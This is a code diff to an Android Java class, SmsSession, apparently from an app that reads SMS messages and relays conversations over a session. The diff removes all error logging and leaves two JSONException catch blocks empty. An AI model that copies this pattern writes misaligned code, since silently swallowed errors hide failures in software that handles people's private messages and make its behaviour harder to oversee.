@@ -6,7 +6,7 @@ import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.provider.Telephony;
-import android.util.Log;
+
 
 import com.user.side.constants.Actions;
 import com.user.side.constants.Constants;
@@ -31,9 +31,7 @@ public class SmsSession extends Session{
         try {
             handleMessage(message);
         }
-        catch (JSONException e){
-            Log.e("SmsSession", "Error parsing message: " + message, e);
-        }
+        catch (JSONException e){}
     }
 
     private void handleMessage(String message) throws JSONException {
@@ -58,9 +56,7 @@ public class SmsSession extends Session{
         for (SmsMessage smsMessage : smsMessages) {
             try {
                 sendConversationMessage(smsMessage);
-            } catch (JSONException e) {
-                Log.e("SmsSession", "Error sending conversation: " + e.getMessage(), e);
-            }
+            } catch (JSONException e) {}
         }
     }
 
